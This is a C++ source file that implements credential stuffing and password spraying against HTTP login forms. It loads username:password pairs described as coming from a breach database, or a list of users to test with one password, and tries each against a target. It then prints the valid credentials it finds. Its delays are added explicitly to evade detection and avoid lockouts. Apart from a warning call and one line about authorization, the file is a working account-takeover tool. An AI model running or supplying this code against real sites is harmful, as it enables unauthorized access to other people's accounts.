#include <iostream>
#include <fstream>
#include <string>
#include <chrono>
#include <thread>
#include <sstream>
#include <vector>
#include "online_attacks.hpp"

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <unistd.h>
    #define closesocket close
#endif

using namespace std;
using namespace std::chrono;

extern void printWarning();
extern bool initializeSockets();
extern void cleanupSockets();
extern string parseHost(const string& url);
extern string parsePath(const string& url);
extern bool testHTTPLogin(const string& host, int port, const string& path,
                         const string& username, const string& password,
                         const string& usernameField, const string& passwordField);

vector<Credential> loadCredentials(const string& filename) {
    vector<Credential> credentials;
    ifstream file(filename);

    if (!file.is_open()) {
        cerr << "[!] Failed to open credential file: " << filename << endl;
        return credentials;
    }

    string line;
    while (getline(file, line)) {
        size_t delimiter = line.find(':');
        if (delimiter != string::npos) {
            Credential cred;
            cred.username = line.substr(0, delimiter);
            cred.password = line.substr(delimiter + 1);
            credentials.push_back(cred);
        }
    }

    file.close();
    return credentials;
}

void runCredentialStuffing(const string& url, const string& credentialFile,
                           const string& proxyUrl, int delayMs) {

    printWarning();

    if (!initializeSockets()) {
        cerr << "[!] Failed to initialize sockets\n";
        return;
    }

    cout << "\n[+] Loading credentials from breach database...\n";
    vector<Credential> credentials = loadCredentials(credentialFile);

    if (credentials.empty()) {
        cerr << "[!] No credentials loaded\n";
        cleanupSockets();
        return;
    }

    string host = parseHost(url);
    string path = parsePath(url);
    int port = 80;

    if (url.find("https://") != string::npos) {
        port = 443;
        cout << "[!] HTTPS requires additional SSL/TLS implementation\n";
    }

    if (!proxyUrl.empty()) {
        cout << "[+] Proxy support: " << proxyUrl << " (basic implementation)\n";
        cout << "[!] For production use, consider tools like Burp Suite or ZAP\n";
    }

    cout << "\n[+] Starting Credential Stuffing Attack\n";
    cout << "[+] Target: " << host << ":" << port << path << "\n";
    cout << "[+] Total credentials to test: " << credentials.size() << "\n";
    cout << "[+] Delay: " << delayMs << "ms per attempt\n";
    cout << "[+] Rate limiting enabled to avoid detection\n\n";

    long long attempts = 0;
    int successCount = 0;
    vector<Credential> validCredentials;

    auto start = high_resolution_clock::now();

    for (const auto& cred : credentials) {
        attempts++;

        cout << "[" << attempts << "/" << credentials.size() << "] Testing: "
             << cred.username << " : " << cred.password << "...";
        cout.flush();

        if (testHTTPLogin(host, port, path, cred.username, cred.password,
                         "username", "password")) {
            successCount++;
            validCredentials.push_back(cred);
            cout << " SUCCESS!\n";
            cout << "[!] Valid credential found: " << cred.username
                 << " : " << cred.password << "\n";
        } else {
            cout << " Failed\n";
        }

        // Rate limiting
        this_thread::sleep_for(milliseconds(delayMs));
    }

    auto end = high_resolution_clock::now();
    auto duration = duration_cast<seconds>(end - start);

    cout << "\n" << string(60, '=') << "\n";
    cout << "CREDENTIAL STUFFING RESULTS\n";
    cout << string(60, '=') << "\n";
    cout << "Total attempts: " << attempts << "\n";
    cout << "Valid credentials found: " << successCount << "\n";
    cout << "Time taken: " << duration.count() << " seconds\n";

    if (successCount > 0) {
        cout << "\nValid Credentials:\n";
        for (const auto& cred : validCredentials) {
            cout << "  " << cred.username << " : " << cred.password << "\n";
        }
    }

    cout << string(60, '=') << "\n";

    cleanupSockets();
}

void runPasswordSpraying(const string& url, const string& userlistFile,
                        const string& password, int delayMs) {

    printWarning();

    if (!initializeSockets()) {
        cerr << "[!] Failed to initialize sockets\n";
        return;
    }

    ifstream userFile(userlistFile);
    if (!userFile.is_open()) {
        cerr << "[!] Failed to open user list: " << userlistFile << endl;
        cleanupSockets();
        return;
    }

    vector<string> usernames;
    string username;
    while (getline(userFile, username)) {
        usernames.push_back(username);
    }
    userFile.close();

    if (usernames.empty()) {
        cerr << "[!] No usernames loaded\n";
        cleanupSockets();
        return;
    }

    string host = parseHost(url);
    string path = parsePath(url);
    int port = 80;

    if (url.find("https://") != string::npos) {
        port = 443;
        cout << "[!] HTTPS requires additional SSL/TLS implementation\n";
    }

    cout << "\n[+] Starting Password Spraying Attack\n";
    cout << "[+] Target: " << host << ":" << port << path << "\n";
    cout << "[+] Password to spray: " << password << "\n";
    cout << "[+] Total users: " << usernames.size() << "\n";
    cout << "[+] Delay: " << delayMs << "ms (IMPORTANT: Long delays prevent lockouts)\n";
    cout << "[!] WARNING: Password spraying can trigger account lockouts!\n";
    cout << "[!] Use with caution and proper authorization\n\n";

    long long attempts = 0;
    int successCount = 0;
    vector<string> validUsers;

    auto start = high_resolution_clock::now();

    for (const auto& user : usernames) {
        attempts++;

        cout << "[" << attempts << "/" << usernames.size() << "] Testing: "
             << user << " : " << password << "...";
        cout.flush();

        if (testHTTPLogin(host, port, path, user, password,
                         "username", "password")) {
            successCount++;
            validUsers.push_back(user);
            cout << " SUCCESS!\n";
            cout << "[!] Valid credential: " << user << " : " << password << "\n";
        } else {
            cout << " Failed\n";
        }

        // Long delay to avoid account lockouts
        this_thread::sleep_for(milliseconds(delayMs));
    }

    auto end = high_resolution_clock::now();
    auto duration = duration_cast<seconds>(end - start);

    cout << "\n" << string(60, '=') << "\n";
    cout << "PASSWORD SPRAYING RESULTS\n";
    cout << string(60, '=') << "\n";
    cout << "Total attempts: " << attempts << "\n";
    cout << "Valid credentials found: " << successCount << "\n";
    cout << "Time taken: " << duration.count() << " seconds\n";

    if (successCount > 0) {
        cout << "\nValid Users:\n";
        for (const auto& user : validUsers) {
            cout << "  " << user << " : " << password << "\n";
        }
    }

    cout << string(60, '=') << "\n";

    cleanupSockets();
}
